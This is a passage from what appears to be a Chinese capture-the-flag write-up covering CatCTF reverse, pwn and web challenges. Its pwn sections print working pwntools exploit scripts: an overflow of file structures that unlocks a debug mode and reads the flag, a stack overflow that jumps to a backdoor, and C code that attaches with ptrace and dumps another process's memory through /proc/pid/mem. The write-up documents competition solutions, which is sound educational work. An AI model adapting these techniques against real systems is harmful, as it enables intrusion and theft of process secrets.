ChildKey1); //解密 <br>    printf(&quot;解密以后的明文:&quot;);<br>    char* flag = (char*)Data;<br>    for (int k = 0; k &lt; 16; k++) &#123;<br>        printf(&quot;%c&quot;, flag[k]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>就是发现还有一串 base64 微改之后的加密，似乎是调试的时候才会出现，不过没发现有什么用，白解了半天，呜呜。</p>
<h2 id="ReadingSection"><a href="#ReadingSection" class="headerlink" title="ReadingSection"></a>ReadingSection</h2><p>llvm ir 写的，直接安装 llvm 的组件后把 ir 编译成 <code>.o</code> 文件就可以拿 IDA 读了。</p>
<p>打开一看发现是 TEA，另外还有一个异或：</p>
<p class='item-img' data-src='https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301012001142.png'><img src="https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301012001142.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;  <br>#include &lt;stdint.h&gt;  <br>void decrypt(uint32_t * v, uint32_t * k) &#123;<br>    uint32_t v0 = v[0], v1 = v[1], sum = 0xCA7C7F00*28, i;  /* set up */<br>    uint32_t delta = 0xCA7C7F00;                     /* a key schedule constant */<br>    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];   /* cache key */<br>    for (i = 0; i &lt; 28; i++) &#123;                         /* basic cycle start */<br>        v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);<br>        v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);<br>        sum -= delta;<br>    &#125;                                              /* end cycle */<br>    v[0] = v0; v[1] = v1;<br>&#125;<br>int main()<br>&#123;<br>    unsigned char _L__const__Z5checkv_rightcat[] =<br>    &#123;<br>      0xAA, 0x7D, 0x07, 0x7D, 0xB1, 0xF7, 0x80, 0x71, 0xDA, 0xAF,<br>      0x23, 0xE5, 0x10, 0x07, 0x58, 0x57, 0x1E, 0xF7, 0x7D, 0x71,<br>      0xE6, 0x78, 0x74, 0x56, 0x9B, 0xC0, 0x53, 0x11, 0xF3, 0x39,<br>      0x31, 0x2E<br>    &#125;;<br>    uint32_t k[] = &#123; 0x18BC8A17 ,0x29D3CE1E ,0x42F740E3 ,0x199C7F4A &#125;;<br>    decrypt(((uint32_t*)(_L__const__Z5checkv_rightcat)), k);<br>    decrypt(((uint32_t*)(_L__const__Z5checkv_rightcat))+2, k);<br>    decrypt(((uint32_t*)(_L__const__Z5checkv_rightcat))+4, k);<br>    decrypt(((uint32_t*)(_L__const__Z5checkv_rightcat))+6, k);<br>    for (int i = 30; i &gt;= 0; i--)<br>    &#123;<br>        _L__const__Z5checkv_rightcat[i] ^= _L__const__Z5checkv_rightcat[i + 1];<br>    &#125;<br>    printf(&quot;%s&quot;, _L__const__Z5checkv_rightcat);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="The-cat-did-it"><a href="#The-cat-did-it" class="headerlink" title="The cat did it"></a>The cat did it</h2><p>没啥头绪，纯考猜。看他问概率多少，直接猜了 0%，然后就对了，反正我自己也没搞明白。</p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="vmbyhrp"><a href="#vmbyhrp" class="headerlink" title="vmbyhrp"></a>vmbyhrp</h2><p>DEBUG 模式里有一个 charge_file 可以从外面读文件：</p>
<p class='item-img' data-src='https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301012001279.png'><img src="https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301012001279.png"></p>
<p>因此关键就是进入 DEBUG 模式了。发现需要 users 和 users+4 都为 0 才能进，转而发现创建文件的函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall create_file(__int64 a1)<br>&#123;<br>  __int64 result; // rax<br>  int v2; // ebx<br><br>  result = check_repeat(a1);<br>  if ( result )<br>  &#123;<br>    *(&amp;unk_204130 + 4 * file_count) = global_fd;<br>    *(&amp;unk_204128 + 4 * file_count) = a1;<br>    *(&amp;HF + 4 * file_count) = 1000LL;<br>    v2 = file_count;<br>    *(&amp;unk_204138 + 4 * v2) = malloc(0x1000uLL);<br>    printf(&quot;FILE CONTENT: &quot;);<br>    read(0, *(&amp;unk_204138 + 4 * file_count), 0x1000uLL);<br>    deleEnter(*(&amp;unk_204138 + 4 * file_count));<br>    ++file_count;<br>    result = ++global_fd;<br>  &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>没有检查数量，因此可以创建很多文件去把结构体溢出到 user。</p>
<p>然后注意到 <code>HRP_OPEN</code> 可以用输入去覆盖相应偏移处的值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">unsigned __int64 __fastcall HRP_OPEN(int a1, int a2)<br>&#123;<br>  int i; // [rsp+1Ch] [rbp-24h]<br>  char v4[24]; // [rsp+20h] [rbp-20h] BYREF<br>  unsigned __int64 v5; // [rsp+38h] [rbp-8h]<br><br>  v5 = __readfsqword(0x28u);<br>  for ( i = 0; i &lt; file_count; ++i )<br>  &#123;<br>    if ( a1 == *(&amp;unk_204130 + 4 * i) )<br>    &#123;<br>      *(&amp;HF + 4 * i) = a2;//&lt;------这里可以覆盖<br>      return __readfsqword(0x28u) ^ v5;<br>    &#125;<br>  &#125;<br>  clearScreen();<br>  puts(&quot;NOT FOUND,PLEASE NEW FILE&quot;);<br>  printf(&quot;%s&quot;, &quot;FILE NAME: &quot;);<br>  __isoc99_scanf(&quot;%16s[^\n ]&quot;, v4);<br>  getchar();<br>  deleEnter(v4);<br>  create_file(v4);<br>  return __readfsqword(0x28u) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>所以思路就是创建很多文件，然后用汇编去覆盖 users 变量，最后进 DEBUG 模式把文件读进来，然后用 cat 拿出来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br><br>#p=process(&quot;./HRPVM&quot;)<br>p=remote(&quot;223.112.5.156&quot;,60024)<br>#gdb.attach(p,&quot;b*$rebase(0x2DFF)\nb*$rebase(0x2950)\nb*$rebase(0x25B2)&quot;)<br>p.recvuntil(&quot;NAME:&quot;)<br>name=&quot;HRPHRP&quot;<br>password=&quot;PWNME&quot;<br>p.sendline(name)<br>p.recvuntil(&quot;PASSWORD:&quot;)<br>p.sendline(password)<br>p.recvuntil(&quot;[+]HOLDER:&quot;)<br>p.sendline(&quot;aaaaaaaaaaaaaaaa&quot;)<br>def send_res(payload):<br>    p.recvuntil(&quot;HRP-MACHINE$ &quot;)<br>    p.sendline(payload)<br>def send_res2(payload):<br>    p.recvuntil(&quot;[DEBUGING]root#&quot;)<br>    p.sendline(payload)<br><br>payload=&quot;file&quot;<br>for i in range(30):<br>    send_res(&quot;file&quot;)<br>    p.recvuntil(&quot;FILE NAME: &quot;)<br>    p.sendline(&quot;a&quot;+str(i))<br>    p.recvuntil(&quot;FILE CONTENT: &quot;)<br>    p.sendline(&quot;mov rdi,36;mov rsi,1001;call open,2;&quot;)<br><br>send_res(&quot;file&quot;)<br>p.recvuntil(&quot;FILE NAME: &quot;)<br>p.sendline(&quot;a30&quot;)<br>p.recvuntil(&quot;FILE CONTENT: &quot;)<br>p.sendline(&quot;mov rdi,35;mov rsi,0;call open,2;&quot;)<br><br>send_res(&quot;file&quot;)<br>p.recvuntil(&quot;FILE NAME: &quot;)<br>p.sendline(&quot;a31&quot;)<br>p.recvuntil(&quot;FILE CONTENT: &quot;)<br>p.sendline(&quot;mov rdi,35;mov rsi,0;call open,2;&quot;)<br><br>send_res(&quot;./a30&quot;)<br>send_res(&quot;DEBUG&quot;)<br>send_res2(&quot;file input&quot;)<br>p.recvuntil(&quot;FILE NAME:&quot;)<br>p.sendline(&quot;flag&quot;)<br>send_res2(&quot;mmap&quot;)<br>p.recvuntil(&quot;EXPEND:&quot;)<br>p.sendline(str(0x400000))<br>send_res2(&quot;exit&quot;)<br><br>send_res(&quot;reboot&quot;)<br>p.recvuntil(&quot;NAME:&quot;)<br>p.sendline(name)<br>p.recvuntil(&quot;PASSWORD:&quot;)<br>p.sendline(password)<br>p.recvuntil(&quot;[+]HOLDER:&quot;)<br>p.sendline(p64(0x400000))<br>send_res(&quot;./a0&quot;)<br>send_res(&quot;cat flag&quot;)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>不过有一个小问题，当我把 flag 读进来之后用 exit 返回用户模式时，直接 cat 会引发崩溃。根据崩溃报告发现，似乎会正好引用 HOLDER 处的内存。因此 DEBUG 下还得调用 mmap 开辟一下空间，然后 reboot 设置 HOLDER 为开辟出来的可以读写的内存，这样才不会崩溃。</p>
<h2 id="bitcoin"><a href="#bitcoin" class="headerlink" title="bitcoin"></a>bitcoin</h2><p>栈溢出，有后门，直接跳过去就是了，没啥好说的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br><br>#p=process(&quot;./pwn&quot;)<br>p=remote(&quot;223.112.5.156&quot;,57023)<br>#gdb.attach(p,&quot;set follow-fork-mode parent\nb*0x40223B&quot;)<br>p.recvuntil(&quot;CTF!&quot;)<br>p.sendline(&quot;\n&quot;)<br>p.recvuntil(&quot;Name: &quot;)<br>p.sendline(&quot;aaa&quot;)<br>p.recvuntil(&quot;Password: &quot;)<br>payload=b&quot;a&quot;*(64)+p64(0x06092C0+0x420)+p64(0x404EA4)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="injection2-0"><a href="#injection2-0" class="headerlink" title="injection2.0"></a>injection2.0</h2><p>whoami 一看是 root，搜了一下似乎用 ptrace 能直接去读取其他进程的内存，于是就把整个栈全都读出来就可以了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/ptrace.h&gt;<br>#include &lt;sys/wait.h&gt;<br>#include &lt;errno.h&gt;<br>int main(int argc, char *argv[])&#123;<br>    off_t start_addr;<br>    pid_t pid;<br>    char s1[]=&quot;131&quot;;<br>    start_addr=0x7ffc08baf000;<br>    pid = atoi(s1);<br>    printf(&quot;%lx\n&quot;,start_addr);<br>    int ptrace_ret;<br>    ptrace_ret = ptrace(PTRACE_ATTACH, pid, NULL, NULL);<br>    if (ptrace_ret == -1) &#123;<br>        fprintf(stderr, &quot;ptrace attach failed.\n&quot;);<br>        perror(&quot;ptrace&quot;);<br>        return -1;<br>    &#125;<br><br>    if (waitpid(pid, NULL, 0) == -1) &#123;<br>        fprintf(stderr, &quot;waitpid failed.\n&quot;);<br>        perror(&quot;waitpid&quot;);<br>        ptrace(PTRACE_DETACH, pid, NULL, NULL);<br>        return -1;<br>    &#125;<br>    int fd;<br>    char path[256] = &#123;0&#125;;<br>    sprintf(path, &quot;/proc/%d/mem&quot;, pid);<br>    fd = open(path, O_RDWR);<br>    if (fd == -1) &#123;<br>        fprintf(stderr, &quot;open file failed.\n&quot;);<br>        perror(&quot;open&quot;);<br>        ptrace(PTRACE_DETACH, pid, NULL, NULL);<br>        return -1;<br>    &#125;<br>    off_t off;<br>    off = lseek(fd, start_addr, SEEK_SET);<br>    if (off == (off_t)-1) &#123;<br>        fprintf(stderr, &quot;lseek failed.\n&quot;);<br>        perror(&quot;lseek&quot;);<br>        ptrace(PTRACE_DETACH, pid, NULL, NULL);<br>        close(fd);<br>        return -1;<br>    &#125;<br>    else&#123;<br>        printf(&quot;lseek sucess\n&quot;);    &#125;<br>        unsigned char *buf = (unsigned char *)malloc(0x21000);<br>        int rd_sz;<br>        while(rd_sz=read(fd,buf,0x21000))&#123;<br>        if(rd_sz&lt;10)&#123;<br>            perror(&quot;read&quot;);<br>            break;<br>    &#125;<br>    printf(&quot;%lx\n&quot;,rd_sz);<br>    for(int i=0;i&lt;0x21000;i++)&#123;<br>        printf(&quot;%c&quot;,buf[i]);<br>    &#125;<br>    printf(&quot;\n&quot;);<br>    ptrace(PTRACE_DETACH, pid, NULL, NULL);<br>    free(buf);<br>    close(fd);<br>    return 0;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>不过直接读出来的东西似乎显示的很不完全，我一度以为自己的方法不行，最后直接把内容 base64 后拉到本地再解回去看了，然后就发现还是有的：</p>
<p class='item-img' data-src='https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301012002725.png'><img src="https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301012002725.png"></p>
<p class='item-img' data-src='https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301012003636.png'><img src="https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301012003636.png"></p>
<h2 id="welcome-CAT-CTF"><a href="#welcome-CAT-CTF" class="headerlink" title="welcome_CAT_CTF"></a>welcome_CAT_CTF</h2><p>这题我是直接拿 gdb 搞定的，没写 exp。题目给了服务端和客户端，然后分数是储存在客户端的，所以直接用 gdb 改内存设成大数，然后直接改寄存器跳转执行后门函数就可以了（忘记截图了）</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ez-js"><a href="#ez-js" class="headerlink" title="ez_js"></a>ez_js</h2><p>访问一下那个 game.js 就发现里面写了 flag 的路径，然后直接过去就行了：</p>
<p class='item-img' data-src='https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301012003588.png'><img src="https://cdn.jsdelivr.net/gh/ErodedElk/blogPic/img/202301012003588.png"></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/02/20/glibc2-34-iofile-exploit/">← Next GLIBC2.34以后的IO FILE利用链</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/11/04/CVE-2022-23613-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%E5%8F%AF%E8%83%BD%E6%80%A7%E5%B0%9D%E8%AF%95/">CVE-2022-23613 漏洞复现与利用可能性尝试 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%B2%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">闲言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cat-Jump"><span class="toc-number">2.1.</span> <span class="toc-text">Cat_Jump</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MeowMeow"><span class="toc-number">2.2.</span> <span class="toc-text">MeowMeow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CatchCat"><span class="toc-number">2.3.</span> <span class="toc-text">CatchCat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nepnep-%E7%A5%9D%E4%BD%A0%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90%E5%95%A6%EF%BC%81"><span class="toc-number">2.4.</span> <span class="toc-text">Nepnep 祝你新年快乐啦！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CatFlag"><span class="toc-number">2.5.</span> <span class="toc-text">CatFlag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cat%E2%80%99s-gift"><span class="toc-number">3.1.</span> <span class="toc-text">cat’s gift</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#StupidOrangeCat2"><span class="toc-number">4.1.</span> <span class="toc-text">StupidOrangeCat2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SM4"><span class="toc-number">4.1.1.</span> <span class="toc-text">SM4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RC5"><span class="toc-number">4.1.2.</span> <span class="toc-text">RC5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ReadingSection"><span class="toc-number">4.2.</span> <span class="toc-text">ReadingSection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-cat-did-it"><span class="toc-number">4.3.</span> <span class="toc-text">The cat did it</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">5.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#vmbyhrp"><span class="toc-number">5.1.</span> <span class="toc-text">vmbyhrp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bitcoin"><span class="toc-number">5.2.</span> <span class="toc-text">bitcoin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#injection2-0"><span class="toc-number">5.3.</span> <span class="toc-text">injection2.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#welcome-CAT-CTF"><span class="toc-number">5.4.</span> <span class="toc-text">welcome_CAT_CTF</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">6.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-js"><span class="toc-number">6.1.</span> <span class="toc-text">ez_js</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>